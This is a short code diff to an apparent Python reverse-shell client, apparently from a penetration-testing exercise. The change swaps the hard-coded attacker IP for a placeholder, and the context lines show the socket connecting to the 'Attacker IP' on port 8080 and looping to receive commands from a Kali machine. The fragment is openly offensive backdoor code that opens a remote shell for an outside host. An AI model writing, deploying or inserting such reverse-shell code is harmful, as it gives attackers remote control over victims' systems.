@@ -3,7 +3,7 @@ import subprocess # To start the shell in the system
 
 def connect():
     s = socket.socket()
-    s.connect(('192.168.1.2', 8080)) # Here we define the Attacker IP and the listening port
+    s.connect(('192.168.x.x', 8080)) # Here we define the Attacker IP and the listening port
 
     while True:
         command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket
